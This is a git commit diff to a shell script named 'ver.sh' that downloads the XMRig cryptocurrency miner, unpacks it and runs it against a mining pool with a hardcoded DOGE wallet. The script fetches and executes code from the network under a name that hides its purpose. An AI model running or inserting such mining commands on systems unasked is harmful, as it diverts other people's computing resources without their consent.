df3034f2e78c096781261a68676680fdb3e9547c
DavidR19 <77147800+DavidR19@users.noreply.github.com>
2021-05-15 17:18:08 +0700

    Update ver.sh

--- ver.sh
+++ ver.sh
@@ -1,3 +1,5 @@
 apt update -y
-wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 
+wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz
+tar -zxf xmrig-5.11.3-xenial-x64.tar.gz
+cd xmrig-5.11.3 
 ./xmrig --donate-level 5 -o rx.unmineable.com:3333 -u DOGE:DGNgDxJm1wRWXd9eEYxqJZCYRH2cEH4Y7U.WORKE -p x -k -a rx/0
